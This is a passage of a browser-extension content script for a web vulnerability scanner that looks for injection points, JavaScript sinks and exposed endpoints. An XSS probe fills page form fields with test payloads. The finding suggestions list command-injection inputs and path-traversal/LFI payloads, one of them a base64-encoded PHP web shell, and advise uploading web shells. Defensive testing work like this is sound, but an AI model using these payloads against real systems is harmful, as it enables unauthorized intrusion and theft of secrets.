// content.js — DOM scanning, vuln detection, copilot overlay
// Payload strings are test vectors for authorized security testing.
// ══════════════════════════════════════════════════════════════════

(() => {
  if (window.__rceHunterLoaded) return;
  if (window.location.protocol === 'chrome:' || window.location.protocol === 'chrome-extension:') return;
  // Bail if the extension context is not available (service worker gone / reload race)
  if (!chrome.runtime?.id) return;
  window.__rceHunterLoaded = true;

  // Report content-script errors to the background collector (Diagnostics view)
  try {
    window.addEventListener("error", e => { try { if (e.filename && e.filename.includes("content.js")) chrome.runtime.sendMessage({ type: "REPORT_ERROR", source: "content", error: { message: e.message, stack: e.error && e.error.stack, url: location.href } }); } catch {} });
  } catch {}

  // Content → background activity log bridge
  function clog(level, category, message, detail) { try { chrome.runtime.sendMessage({ type: "YLOG", level, category, message, detail }); } catch {} }

  // Performance: track when the tab was last visible so we can skip scans on long-idle tabs
  let lastActiveTime = Date.now();
  try {
    document.addEventListener("visibilitychange", () => { if (document.visibilityState === "visible") lastActiveTime = Date.now(); });
  } catch {}
  let lightweightMode = false;

  const DEBUG = false;
  function dbg(...a) { if (DEBUG) console.log("%c[YANSII]", "color:#e8403a;font-weight:bold", ...a); }
  function dbgWarn(...a) { if (DEBUG) console.warn("%c[YANSII]", "color:#d29922;font-weight:bold", ...a); }
  function dbgOk(...a) { if (DEBUG) console.log("%c[YANSII]", "color:#3fb950;font-weight:bold", ...a); }

  let extensionEnabled = true;
  let scanPaused = false;
  let autoScanErrors = 0;
  const AUTO_SCAN_ERROR_LIMIT = 3;

  // ── Scope & Filtering Configuration ──
  // G.targetScope: array of domain patterns (e.g. "*.example.com", "api.target.com")
  // G.outOfScopeTypes: array of finding type prefixes to suppress
  const G = {
    targetScope: [],
    outOfScopeTypes: [],
  };

  // OAuth/OIDC/PKCE parameter names — never flag as SQLi, CMDi, or SSRF
  const OAUTH_PARAMS = new Set([
    "state", "code", "code_challenge", "code_challenge_method", "session_state",
    "nonce", "id_token", "access_token", "token_type", "expires_in", "scope",
    "response_type", "response_mode", "client_id", "redirect_uri", "grant_type",
    "acr_values", "post_logout_redirect_uri", "login_redirect", "id_token_hint",
    "login_hint", "prompt", "max_age", "ui_locales", "claims_locales",
    "registration", "request", "request_uri", "code_verifier",
  ]);

  // Common form field names that should NOT trigger CMDi
  const SAFE_FORM_FIELDS = new Set([
    "login", "password", "passwd", "pwd", "email", "username", "user",
    "name", "first_name", "last_name", "firstname", "lastname",
    "search", "q", "query", "keyword", "keywords", "term",
    "phone", "tel", "mobile", "address", "city", "state", "zip",
    "country", "comment", "message", "subject", "title", "description",
    "company", "organization", "website", "url", "captcha", "token",
    "csrf", "nonce", "remember", "remember_me", "agree", "terms",
    "newsletter", "subscribe", "language", "locale", "currency",
  ]);

  // Redirect-specific params — flag as Open Redirect, not SSRF
  const REDIRECT_PARAMS = new Set([
    "redirect_uri", "post_logout_redirect_uri", "login_redirect",
  ]);

  function matchesScope(domain) {
    if (G.targetScope.length === 0) return true;
    for (const pattern of G.targetScope) {
      if (pattern.startsWith("*.")) {
        const suffix = pattern.slice(1);
        if (domain === pattern.slice(2) || domain.endsWith(suffix)) return true;
      } else {
        if (domain === pattern) return true;
      }
    }
    return false;
  }

  function isOutOfScopeType(findingType) {
    for (const prefix of G.outOfScopeTypes) {
      if (findingType.startsWith(prefix)) return true;
    }
    return false;
  }

  chrome.storage.sync.get(["enabled", "scanPaused", "lightweightMode", "targetScope", "outOfScopeTypes"], (data) => {
    extensionEnabled = data.enabled !== false;
    scanPaused = data.scanPaused === true;
    lightweightMode = data.lightweightMode === true;
    if (Array.isArray(data.targetScope)) G.targetScope = data.targetScope;
    if (Array.isArray(data.outOfScopeTypes)) G.outOfScopeTypes = data.outOfScopeTypes;
    dbg("Loaded on:", location.href, "| Enabled:", extensionEnabled, "| Paused:", scanPaused, "| Scope:", G.targetScope.length || "all", "| OOS types:", G.outOfScopeTypes.length || "none");

    if (extensionEnabled && !scanPaused) {
      if (document.readyState === "complete" || document.readyState === "interactive") {
        setTimeout(autoScan, 500); // slight delay to ensure DOM is ready
      } else {
        window.addEventListener("DOMContentLoaded", () => setTimeout(autoScan, 500));
      }
    }
  });

  // Keep the pause flag live without a page reload
  try {
    chrome.storage.onChanged.addListener((changes, area) => {
      if (area === "sync" && changes.scanPaused) scanPaused = changes.scanPaused.newValue === true;
      if (area === "sync" && changes.lightweightMode) lightweightMode = changes.lightweightMode.newValue === true;
    });
  } catch {}

  // ── Vendor library detection (skip these in AI analysis) ──
  const VENDOR_PATTERNS = /jquery|react|angular|vue|bootstrap|lodash|underscore|moment|d3\.min|chart\.min|popper|backbone|ember|mootools|prototype\.js|dojo|ext-all|tinymce|ckeditor|codemirror|ace\.js|three\.min|pixi|phaser|gsap|anime\.min|swiper|leaflet|mapbox|firebase|aws-sdk|stripe|recaptcha|gtag|analytics|gtm|fbevents|hotjar|clarity|sentry|datadog|datadoghq|newrelic|datatables|primef|google-maps|cloudflare|cookielaw/i;
  const VENDOR_INLINE_PATTERNS = /^\s*(Liferay\.Loader|Liferay\.fire|Liferay\.on|Liferay\.after|Liferay\.provide|AUI\(\)|jQuery\(|jQuery\.|\$\(document\)|\$\(function|\$\(window\))/;


  function autoScan() {
    if (scanPaused) { dbg("Auto-scan paused — skipping"); return; }
    // Performance: skip auto-scan on tabs that have been hidden for 5+ minutes
    if (document.visibilityState !== "visible") {
      const inactiveMinutes = (Date.now() - lastActiveTime) / 60000;
      if (inactiveMinutes > 5) {
        clog("info", "scan", "Scan skipped: tab inactive for " + Math.round(inactiveMinutes) + " minutes");
        return;
      }
    }
    if (autoScanErrors >= AUTO_SCAN_ERROR_LIMIT) {
      dbgWarn("Auto-scan disabled after", autoScanErrors, "consecutive errors on this page");
      return;
    }
    try {
      dbg("🔍 AUTO-SCAN starting...");
      const t0 = performance.now();
      const results = runFullScan();
      const ms = (performance.now() - t0).toFixed(0);
      autoScanErrors = 0;

      if (results.findings.length > 0) {
        dbgOk(`✓ AUTO-SCAN done in ${ms}ms — ${results.findings.length} findings:`);
        const bySev = {};
        results.findings.forEach(f => { bySev[f.severity] = (bySev[f.severity] || 0) + 1; });
        if (DEBUG) {
          console.table(bySev);
          results.findings.forEach(f => {
            const color = f.severity === "critical" ? "color:red" : f.severity === "high" ? "color:orange" : "color:yellow";
            console.log(`  %c[${f.severity}]%c ${f.type}${f.subtype ? " ("+f.subtype+")" : ""}: ${(f.detail||"").slice(0,100)}`, color, "color:inherit");
          });
        }
      } else {
        dbgWarn(`AUTO-SCAN done in ${ms}ms — 0 findings on ${location.href}`);
      }

      // Fire-and-forget — don't use callback (background handler doesn't respond)
      try {
        chrome.runtime.sendMessage({ type: "AUTO_SCAN_RESULTS", payload: results });
        dbgOk("Results sent to background");
      } catch (e2) {
        dbgWarn("Send error:", e2.message);
      }

    } catch (e) {
      autoScanErrors++;
      if (DEBUG) console.error("[YANSII] AUTO-SCAN ERROR:", e.message);
    }
  }

  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === "SET_ENABLED") {
      extensionEnabled = msg.enabled;
      dbg("Enabled →", extensionEnabled);
    }
    // XSS probe — injects harmless test strings into form fields for authorized security testing
    if (msg.type === "XSS_PROBE") {
      dbg("🎯 XSS PROBE — trying multiple payloads sequentially");
      (async () => {
        const payloads = [
          { name: "HTML tag injection", value: '"><u>YANSIIx1</u><img src=x>' },
          { name: "Attribute breakout", value: '" onmouseover="void(/*YANSIIx2*/)" x="' },
          { name: "SVG onload", value: '<svg/onload="void(/*YANSIIx3*/)">' },
          { name: "JS string/template", value: "'-/*YANSIIx4*/-'\"" },
        ];
        const sel = "input[type='text'], input:not([type]), textarea, input[type='search'], input[type='url'], input[type='email'], [contenteditable='true']";
        const results = [];
        for (const p of payloads) {
          let count = 0;
          document.querySelectorAll(sel).forEach(el => {
            if (el.contentEditable === "true") { el.textContent = p.value; }
            else { el.value = p.value; el.dispatchEvent(new Event("input", { bubbles: true })); }
            count++;
          });
          await new Promise(r => setTimeout(r, 400));
          // Heuristic reflection check: does the raw (unencoded) payload appear in the live DOM?
          const html = document.documentElement.innerHTML;
          results.push({ name: p.name, injected: count, reflectedUnencoded: html.includes(p.value) });
        }
        const hits = results.filter(r => r.reflectedUnencoded);
        dbgOk("XSS Probe results: " + JSON.stringify(results));
        // Show individual results in a self-contained on-page overlay
        try {
          const prev = document.getElementById("__yansii_probe_result"); if (prev) prev.remove();
          const box = document.createElement("div");
          box.id = "__yansii_probe_result";
          box.style.cssText = "position:fixed;top:12px;right:12px;z-index:2147483647;max-width:360px;background:#0d1117;color:#c9d1d9;border:1px solid #30363d;border-radius:8px;padding:10px 12px;font:12px/1.4 system-ui,sans-serif;box-shadow:0 6px 24px rgba(0,0,0,.5)";
          const rows = results.map(r => `<div style="display:flex;justify-content:space-between;gap:8px;padding:2px 0"><span>${escapeHtml(r.name)}</span><span style="color:${r.reflectedUnencoded ? '#e8403a' : '#3fb950'};font-weight:600">${r.reflectedUnencoded ? 'REFLECTED (unencoded)' : 'encoded/none'}</span></div>`).join("");
          box.innerHTML = `<div style="font-weight:700;margin-bottom:6px">YANSII XSS Probe — ${document.querySelectorAll(sel).length} field(s)</div>${rows}<div style="margin-top:6px;color:#8b949e">${hits.length ? hits.length + ' payload(s) reflected unencoded — verify manually for XSS.' : 'No unencoded reflection detected.'}</div><div style="text-align:right;margin-top:6px"><span id="__yansii_probe_close" style="cursor:pointer;color:#58a6ff">close</span></div>`;
          document.documentElement.appendChild(box);
          box.querySelector("#__yansii_probe_close").addEventListener("click", () => box.remove());
          setTimeout(() => { if (box.parentNode) box.remove(); }, 12000);
        } catch (e) { dbgWarn("probe overlay error:", e.message); }
      })();
      return;
    }
    if (msg.type === "RUN_SCAN") {
      dbg("🔍 MANUAL SCAN triggered");
      if (!extensionEnabled) {
        dbgWarn("Extension disabled, sending empty results");
        chrome.runtime.sendMessage({
          type: "SCAN_RESULTS",
          payload: { url: window.location.href, timestamp: new Date().toISOString(), title: document.title, findings: [], summary: { total:0, critical:0, high:0, medium:0, low:0, info:0 }, disabled: true }
        });
        return;
      }
      const t0 = performance.now();
      const results = runFullScan();
      const ms = (performance.now() - t0).toFixed(0);
      dbgOk(`MANUAL SCAN done in ${ms}ms — ${results.findings.length} findings`);
      if (DEBUG) results.findings.forEach(f => console.log(`  [${f.severity}] ${f.type}: ${(f.detail||"").slice(0,80)}`));
      chrome.runtime.sendMessage({ type: "SCAN_RESULTS", payload: results });
    }
  });

  function runFullScan() {
    const url = window.location.href;
    const findings = [];

    const MAX_HTML = 2 * 1024 * 1024;
    const rawHtml = document.documentElement.outerHTML;
    const html = rawHtml.length > MAX_HTML ? rawHtml.slice(0, MAX_HTML) : rawHtml;

    // DoS guard: cap element arrays so a hostile page with millions of nodes
    // can't materialize huge arrays and freeze the content script.
    const MAX_EL = 5000;
    const qsa = (sel) => [...document.querySelectorAll(sel)].slice(0, MAX_EL);
    const ctx = {
      url,
      html,
      forms: qsa("form"),
      inlineScripts: qsa("script:not([src])"),
      allScripts: qsa("script"),
      cookies: document.cookie,
      metas: qsa("meta"),
      links: qsa("link"),
      inputs: qsa("input, textarea, select"),
    };

    // P2: directly-observable non-HTML resources (robots.txt, sitemap.xml, JSON API, GraphQL)
    // are tier-3 observables. On such a document we emit ONLY the observable and skip the
    // HTML-oriented detectors, which overclaim on them (e.g. flagging a robots path listing as
    // "SQLi — Database Exposure").
    const observable = detectObservableFiles(ctx);
    if (observable.some(f => ["robots", "sitemap", "api-endpoint", "graphql-endpoint"].includes(f.subtype))) {
      return finalizeScan(observable, url);
    }

    // Lightweight mode: run only essential low-cost scanners (headers/CORS, info
    // disclosure, URL params). Skips template matching, deep DOM/JS, form + library analysis.
    if (lightweightMode) {
      const lite = [];
      const safe = fn => { try { if (typeof fn === "function") lite.push(...fn(ctx)); } catch (e) { dbgWarn("lite scanner error", e.message); } };
      safe(analyzeHeaders);
      safe(detectInfoDisclosure);
      safe(analyzeURL);
      return finalizeScan(lite, url);
    }

    // 1. URL & Query Parameter Analysis
    findings.push(...analyzeURL(ctx));

    // 2. Form & Input Analysis
    findings.push(...analyzeForms(ctx));

    // 3. Response Header Indicators (from meta tags and visible headers)
    findings.push(...analyzeHeaders(ctx));

    // 4. Technology Fingerprinting
    findings.push(...fingerprintTech(ctx));

    // 5. File Upload Detection
    findings.push(...detectFileUploads(ctx));

    // 6. JavaScript Sink Analysis
    findings.push(...analyzeJSSinks(ctx));

    // 7. API Endpoint Discovery
    findings.push(...discoverEndpoints(ctx));

    // 8. Template Injection Indicators
    findings.push(...detectTemplateInjection(ctx));

    // 9. Deserialization Indicators
    findings.push(...detectDeserialization(ctx));

    // 10. SQL Injection Detection
    findings.push(...detectSQLInjection(ctx));

    // 11. WAF / Filter Detection
    findings.push(...detectWAF(ctx));

    // 12. Authentication & Access Bypass Indicators
    findings.push(...detectAuthBypass(ctx));

    // 13. Upload Restriction Bypass Indicators
    findings.push(...detectUploadBypass(ctx));

    // 14. Input Filter / Sanitization Bypass Indicators
    findings.push(...detectFilterBypass(ctx));

    // 15. XSS (Cross-Site Scripting)
    findings.push(...detectXSS(ctx));

    // 16. SSRF (Server-Side Request Forgery)
    findings.push(...detectSSRF(ctx));

    // 17. XXE (XML External Entity)
    findings.push(...detectXXE(ctx));

    // 18. CSRF (Cross-Site Request Forgery)
    findings.push(...detectCSRF(ctx));

    // 19. Open Redirect
    findings.push(...detectOpenRedirect(ctx));

    // 20. Information Disclosure (Secrets, Keys, Credentials)
    findings.push(...detectInfoDisclosure(ctx));

    // 21. Prototype Pollution
    findings.push(...detectPrototypePollution(ctx));

    // 22. NoSQL Injection
    findings.push(...detectNoSQLi(ctx));

    // 23. LDAP Injection
    findings.push(...detectLDAPi(ctx));

    // 24. CRLF Injection
    findings.push(...detectCRLF(ctx));

    // 25. Host Header Injection
    findings.push(...detectHostHeader(ctx));

    // 26. Race Condition Indicators
    findings.push(...detectRaceConditions(ctx));

    // 27. HTTP Request Smuggling Indicators
    findings.push(...detectRequestSmuggling(ctx));

    // 28. Subdomain Takeover Indicators
    findings.push(...detectSubdomainTakeover(ctx));

    // 29. WebSocket Vulnerabilities
    findings.push(...detectWebSocket(ctx));

    // 30. Business Logic Indicators
    findings.push(...detectBusinessLogic(ctx));

    // 31. Command Injection Detection (dedicated scanner)
    findings.push(...detectCommandInjection(ctx));

    // 32. Response Manipulation Detection
    findings.push(...detectResponseManipulation(ctx));

    // 33. Parameter Discovery
    findings.push(...discoverParameters(ctx));

    // 34. Keyword Scanner
    findings.push(...scanKeywords(ctx));

    // 35. Hidden Parameter Discovery
    findings.push(...discoverHiddenParams(ctx));

    // 36. AngularJS / Framework Template Injection
    findings.push(...detectAngularInjection(ctx));

    // 37. Change Detection (page fingerprint)
    findings.push(...detectPageChanges(ctx));

    // 38. GitHub/GitLab Repo Takeover Detection
    findings.push(...detectRepoTakeover(ctx));

    // 39. OAuth State Parameter Check
    findings.push(...detectOAuthState(ctx));

    // 40. IDOR via Filename Pattern Detection
    findings.push(...detectIDORFilename(ctx));

    // 41. Duplicate Account Takeover Detection
    findings.push(...detectDuplicateAccount(ctx));

    // 42. Rate Limiting Detection
    findings.push(...detectRateLimiting(ctx));

    // 43. Default Credentials Scanner
    findings.push(...detectDefaultCreds(ctx));

    // 44. Session Management Audit
    findings.push(...detectSessionAudit(ctx));

    // 45. API Endpoint Discovery Enhancement
    findings.push(...detectAPIEndpoints(ctx));

    // 46. GraphQL Endpoint Detection
    findings.push(...detectGraphQL(ctx));

    return finalizeScan(findings, url);
  }

  // Scope/OOS filtering + summary + payload shape — shared by full and lightweight scans.
  function finalizeScan(findings, url) {
    let filtered = findings;
    if (G.targetScope.length > 0) {
      const currentDomain = new URL(url).hostname;
      if (!matchesScope(currentDomain)) {
        filtered = [];
        dbg("Page domain", currentDomain, "not in target scope — all findings suppressed");
      }
    }
    if (G.outOfScopeTypes.length > 0) {
      const before = filtered.length;
      filtered = filtered.filter(f => !isOutOfScopeType(f.type));
      if (filtered.length < before) {
        dbg(`Filtered ${before - filtered.length} out-of-scope findings by type`);
      }
    }
    return {
      url,
      timestamp: new Date().toISOString(),
      title: document.title,
      findings: filtered,
      summary: {
        total: filtered.length,
        critical: filtered.filter(f => f.severity === "critical").length,
        high: filtered.filter(f => f.severity === "high").length,
        medium: filtered.filter(f => f.severity === "medium").length,
        low: filtered.filter(f => f.severity === "low").length,
        info: filtered.filter(f => f.severity === "info").length,
      }
    };
  }

  // ── Scanners — passive vulnerability detection for authorized security testing ──
  // These scanners analyze page content, headers, cookies, and parameters
  // to identify potential security issues. All detection is passive (read-only).
  // Test payload strings in suggestions are for the user to manually verify findings.

  function analyzeURL(ctx) {
    const url = ctx.url;
    const findings = [];
    const parsed = new URL(url);
    const params = [...parsed.searchParams.entries()];

    // Parameters that commonly lead to command injection
    const dangerousParams = [
      "cmd", "exec", "command", "execute", "run", "shell", "system",
      "ping", "jump", "reg", "do", "func", "arg",
      "exe", "module", "payload",
      "ip", "cli",
      "eval", "debug",
    ];

    for (const [key, value] of params) {
      const lk = key.toLowerCase();
      if (OAUTH_PARAMS.has(lk)) continue;
      if (dangerousParams.includes(lk)) {
        findings.push({
          type: "Suspicious Parameter",
          severity: "high",
          detail: `Parameter "${key}" with value "${truncate(value, 80)}" could be injectable`,
          location: url,
          category: "command-injection",
          suggestion: `Test with command injection payloads. Try: ${key}=;id, ${key}=|whoami, ${key}=\`id\``
        });
      }

      // Check for path traversal indicators (#24 enhanced)
      if (value.includes("..") || value.includes("%2e%2e") || value.match(/[\/\\]/)) {
        findings.push({
          type: "Path Traversal Indicator",
          severity: "high",
          detail: `Parameter "${key}" contains path characters: "${truncate(value, 80)}"`,
          location: url,
          category: "path-traversal",
          suggestion: `LFI/Path Traversal bypass payloads:\n• Basic: ${key}=../../../etc/passwd\n• Double dot: ${key}=....//....//....//etc/passwd\n• Double URL encode: ${key}=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd\n• Null byte (PHP <5.3): ${key}=../../../etc/passwd%00\n• UTF-8 overlong: ${key}=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\n• Protocol wrappers (PHP):\n  ${key}=php://filter/convert.base64-encode/resource=index.php\n  ${key}=php://input (POST body = PHP code)\n  ${key}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==\n  ${key}=expect://id\n  ${key}=phar://uploads/evil.phar\n• Directory prefix bypass:\n  ${key}=/var/www/html/../../../etc/passwd\n  ${key}=....\\\\....\\\\etc\\\\passwd (Windows)\n  ${key}=..%5c..%5c..%5cetc%5cpasswd\n  ${key}=..%252f..%252f..%252fetc%252fpasswd\n• Proc read: ${key}=/proc/self/environ (leaks env vars + secrets)`
        });
      }

      // URL in parameter value (SSRF potential) — skip OAuth redirect params
      if ((value.match(/^https?:\/\//i) || value.match(/^\/\//)) && !REDIRECT_PARAMS.has(lk) && !OAUTH_PARAMS.has(lk)) {
        findings.push({
          type: "SSRF Potential",
          severity: "high",
          detail: `Parameter "${key}" contains a URL value — potential SSRF to RCE chain`,
          location: url,
          category: "ssrf"
        });
      }
    }

    // Check for interesting path segments
    const pathSegments = parsed.pathname.split("/").filter(Boolean);
    const interestingPaths = ["api", "admin", "debug", "console", "exec", "shell",
      "eval", "upload", "import", "export", "webhook", "callback",
      "cgi-bin", "cgi", "scripts", "ws", "graphql"];

    for (const seg of pathSegments) {
      if (interestingPaths.includes(seg.toLowerCase())) {
        findings.push({
          type: "Interesting Path",
          severity: "medium",
          detail: `Path segment "/${seg}" may expose dangerous functionality`,
          location: url,
          category: "recon"
        });
      }
    }

    return findings;
  }

  function analyzeForms(ctx) {
    const findings = [];
    const forms = ctx.forms;

    forms.forEach((form, i) => {
      const action = form.getAttribute("action") || "";
      const method = (form.getAttribute("method") || "GET").toUpperCase();
      const inputs = form.querySelectorAll("input, textarea, select");
      const inputNames = [...inputs].map(el => el.name || el.id).filter(Boolean);

      const hasFileInput = form.querySelector('input[type="file"]');
      const hasHiddenInputs = form.querySelectorAll('input[type="hidden"]');

      if (hasFileInput) {
        const accept = hasFileInput.getAttribute("accept") || "any";
        findings.push({
          type: "File Upload",
          severity: "high",
          detail: `Form #${i + 1} has file upload (accept: ${accept}). Test for unrestricted upload → RCE`,
          location: action || ctx.url,
          category: "file-upload",
          suggestion: "Upload web shells (.php, .jsp, .aspx), polyglot files, double extensions"
        });
      }

      if (hasHiddenInputs.length > 0) {
        const hiddenNames = [...hasHiddenInputs].map(h => `${h.name}=${truncate(h.value, 30)}`).join(", ");
        findings.push({
          type: "Hidden Form Fields",
          severity: "medium",
          detail: `Form #${i + 1} has ${hasHiddenInputs.length} hidden fields: ${truncate(hiddenNames, 120)}`,
          location: action || ctx.url,
          category: "recon",
          suggestion: "Modify hidden fields — they may control server-side behavior (template, class, type)"
        });
      }

      // Check for interesting input names
      const dangerousInputs = inputNames.filter(n =>
        /cmd|exec|command|system|eval|code|template|class|type|action|module|func|handler|process|sql|ldap|xpath|host|ping|ip|domain|port|timeout|filename|path|shell|run|dir|file/i.test(n)
      );
      if (dangerousInputs.length > 0) {
        findings.push({
          type: "Suspicious Input Names",
          severity: "high",
          detail: `Form #${i + 1} (${method} ${action}) has suspicious inputs: ${dangerousInputs.join(", ")}`,
          location: action || ctx.url,
          category: "command-injection"
        });
      }
    });

    return findings;
  }

  function analyzeHeaders(ctx) {
    const findings = [];
    const metas = document.querySelectorAll("meta");
    const headers = {};

    metas.forEach(m => {
      const equiv = m.getAttribute("http-equiv");
      const name = m.getAttribute("name");
      const content = m.getAttribute("content") || "";
      if (equiv) headers[equiv.toLowerCase()] = content;
      if (name) headers[name.toLowerCase()] = content;
    });

    // Server identification via generator/powered-by
    const generator = headers["generator"] || "";
    if (generator) {
      findings.push({
        type: "Technology Disclosure",
        severity: "info",
        detail: `Generator meta tag: "${generator}"`,
        location: "meta[name=generator]",
        category: "recon"
      });
    }

    // CSP analysis is handled authoritatively by the background HTTP-header audit
    // ("Header — No CSP" / "Header — CSP unsafe-inline/eval", tier-3). A meta-tag-based
    // check here duplicated those findings (and fired falsely when CSP is set via HTTP
    // header), so it was removed to keep one source of truth.

    return findings;
  }

  function fingerprintTech(ctx) {
    const findings = [];
    const html = ctx.html;
    const scripts = [...document.querySelectorAll("script[src]")].map(s => s.src);
    const allScriptText = scripts.join(" ") + " " + html.slice(0, 50000);

    const techFingerprints = [
      { name: "Java/Spring", patterns: [/jsessionid/i, /\.do\b/, /\.action\b/, /spring/i, /struts/i], severity: "info", note: "Java apps: test JNDI injection, deserialization, SpEL injection" },
      { name: "PHP", patterns: [/\.php/, /phpsessid/i, /x-powered-by.*php/i, /laravel/i], severity: "info", note: "PHP apps: test for system(), exec(), eval() injection, file inclusion" },
      { name: "ASP.NET", patterns: [/\.aspx/, /\.ashx/, /__viewstate/i, /asp\.net/i], severity: "info", note: "ASP.NET: test ViewState deserialization, .NET deserialization" },
      { name: "Node.js/Express", patterns: [/express/i, /node\.js/i, /x-powered-by.*express/i], severity: "info", note: "Node.js: test prototype pollution, child_process injection, template injection" },
      { name: "Python/Django/Flask", patterns: [/django/i, /flask/i, /jinja/i, /csrfmiddlewaretoken/i, /werkzeug/i], severity: "info", note: "Python: test Jinja2 SSTI, pickle deserialization, eval injection" },
      { name: "Ruby on Rails", patterns: [/rails/i, /ruby/i, /_rails_/, /csrf-token.*content/i], severity: "info", note: "Rails: test ERB SSTI, YAML deserialization, Marshal.load" },
      { name: "WordPress", patterns: [/wp-content/i, /wp-includes/i, /wp-json/i], severity: "info", note: "WordPress: check plugin vulns, xmlrpc.php, REST API" },
      { name: "Jenkins", patterns: [/jenkins/i, /hudson/i], severity: "medium", note: "Jenkins: test Groovy script console, build parameter injection" },
      { name: "Apache Struts", patterns: [/struts/i, /\.action\b/], severity: "medium", note: "Struts: historically vulnerable to OGNL injection RCE" },
      { name: "GraphQL", patterns: [/graphql/i, /__schema/i, /graphiql/i], severity: "medium", note: "GraphQL: test for introspection, injection, batching attacks" },
      { name: "WebSocket", patterns: [/wss?:\/\//], severity: "info", note: "WebSocket found: test for command injection via WS messages" },
      { name: "Kubernetes/Docker", patterns: [/kubernetes/i, /docker/i, /k8s/i, /containerid/i], severity: "info", note: "Container env: test for container escape, metadata service SSRF" },
    ];

    for (const tech of techFingerprints) {
      for (const pat of tech.patterns) {
        if (pat.test(allScriptText)) {
          findings.push({
            type: "Technology Detected",
            severity: tech.severity,
            detail: `${tech.name} — ${tech.note}`,
            location: "Page fingerprint",
            category: "recon"
          });
          break;
        }
      }
    }

    return findings;
  }

  function detectFileUploads(ctx) {
    const findings = [];
    const fileInputs = document.querySelectorAll('input[type="file"]');
    const dropzones = document.querySelectorAll('[class*="drop"], [class*="upload"], [id*="upload"], [class*="dropzone"]');

    if (dropzones.length > 0 && fileInputs.length === 0) {
      findings.push({
        type: "JavaScript Upload Zone",
        severity: "medium",
        detail: `Found ${dropzones.length} drag-and-drop upload zone(s) — may accept arbitrary files via JS`,
        location: ctx.url,
        category: "file-upload",
        suggestion: "Intercept the JS upload request and modify Content-Type & file extension"
      });
    }

    return findings;
  }

  function analyzeJSSinks(ctx) {
    const findings = [];
    const scripts = ctx.inlineScripts;
    let inlineJS = "";
    scripts.forEach(s => { inlineJS += s.textContent + "\n"; });

    // Truncate for performance
    inlineJS = inlineJS.slice(0, 100000);

    const sinks = [
      { pattern: /eval\s*\(/g, name: "eval()", severity: "high", note: "Direct code execution sink" },
      { pattern: /Function\s*\(/g, name: "Function()", severity: "high", note: "Dynamic function creation" },
      { pattern: /setTimeout\s*\(\s*['"]/g, name: "setTimeout(string)", severity: "medium", note: "String-based timeout" },
      { pattern: /setInterval\s*\(\s*['"]/g, name: "setInterval(string)", severity: "medium", note: "String-based interval" },
      { pattern: /document\.write\s*\(/g, name: "document.write()", severity: "medium", note: "DOM write sink" },
      { pattern: /\.innerHTML\s*=/g, name: "innerHTML assignment", severity: "medium", note: "HTML injection sink" },
      { pattern: /new\s+WebSocket/g, name: "WebSocket", severity: "info", note: "WebSocket connection — test message injection" },
      { pattern: /postMessage\s*\(/g, name: "postMessage()", severity: "medium", note: "Cross-origin messaging — test for handler vulnerabilities" },
    ];

    // A DOM-XSS finding requires a user-controllable SOURCE feeding a SINK. Detect whether any
    // taint source appears in the same inline-script context. Sink alone is only an INFO indicator.
    const SOURCE_RE = /location\.(?:hash|search|href|pathname)|document\.(?:URL|documentURI|referrer|baseURI|cookie)|window\.name|URLSearchParams|location\[|document\.location|\.searchParams|decodeURIComponent\s*\(\s*(?:location|document\.URL)/;
    const hasSource = SOURCE_RE.test(inlineJS);

    for (const sink of sinks) {
      const matches = inlineJS.match(sink.pattern);
      if (matches) {
        const connected = hasSource;
        findings.push({
          type: connected ? "DOM XSS — Source→Sink" : "JS Sink (indicator)",
          severity: connected ? sink.severity : "info",
          detail: connected
            ? `${sink.name} found ${matches.length}x AND a user-controllable source (location/URL/referrer/window.name) is present in the same inline script — ${sink.note}. Verify the source actually reaches this sink.`
            : `${sink.name} found ${matches.length}x — pattern found; verify whether user input can reach it (no taint source detected in inline scripts).`,
          location: "Inline scripts",
          category: connected ? "dom-xss" : "dom-sink",
          evidence: connected ? "source and sink both present in inline script (data flow unconfirmed)" : "sink only, no source",
        });
      }
    }

    return findings;
  }

  function discoverEndpoints(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 200000);

    // Find API endpoints in HTML/JS
    const apiPatterns = [
      /["'](\/api\/[^"'\s<>]+)["']/g,
      /["'](\/v[0-9]+\/[^"'\s<>]+)["']/g,
      /["'](\/rest\/[^"'\s<>]+)["']/g,
      /["'](\/graphql[^"'\s<>]*)["']/g,
      /["'](\/ws[^"'\s<>]*)["']/g,
      /["'](\/webhook[^"'\s<>]*)["']/g,
      /["'](\/internal\/[^"'\s<>]+)["']/g,
      /["'](\/admin\/[^"'\s<>]+)["']/g,
      /["'](\/debug\/[^"'\s<>]+)["']/g,
    ];

    const endpoints = new Set();
    for (const pat of apiPatterns) {
      let m;
      while ((m = pat.exec(html)) !== null) {
        endpoints.add(m[1]);
      }
    }

    if (endpoints.size > 0) {
      findings.push({
        type: "API Endpoints Discovered",
        severity: "medium",
        detail: `Found ${endpoints.size} endpoint(s): ${[...endpoints].slice(0, 10).join(", ")}${endpoints.size > 10 ? "…" : ""}`,
        location: "Page source",
        category: "recon",
        endpoints: [...endpoints]
      });
    }

    return findings;
  }

  function detectTemplateInjection(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);

    // Look for template syntax that might reflect user input
    const templatePatterns = [
      { pattern: /\{\{.*?\}\}/g, engine: "Handlebars/Angular/Jinja2", payload: "{{7*7}}" },
      { pattern: /\$\{.*?\}/g, engine: "JS Template Literal/FreeMarker", payload: "${7*7}" },
      { pattern: /<%.*?%>/g, engine: "ERB/EJS/JSP", payload: "<%=7*7%>" },
      { pattern: /#\{.*?\}/g, engine: "Ruby/Pug", payload: '#{7*7}' },
    ];

    for (const tp of templatePatterns) {
      const matches = html.match(tp.pattern);
      if (matches && matches.length > 2) {
        findings.push({
          type: "Template Syntax Detected",
          severity: "medium",
          detail: `${tp.engine} template syntax found (${matches.length} instances). Test SSTI with: ${tp.payload}`,
          location: "Page source",
          category: "ssti"
        });
      }
    }

    return findings;
  }

  function detectDeserialization(ctx) {
    const findings = [];
    const html = ctx.html.slice(0, 100000);
    const cookies = ctx.cookies;

    // Java serialization markers
    if (html.includes("rO0AB") || html.includes("aced0005")) {
      findings.push({
        type: "Java Serialized Object",
        severity: "critical",
        detail: "Java serialization magic bytes detected — test for insecure deserialization RCE",
        location: "Page source",
        category: "deserialization",
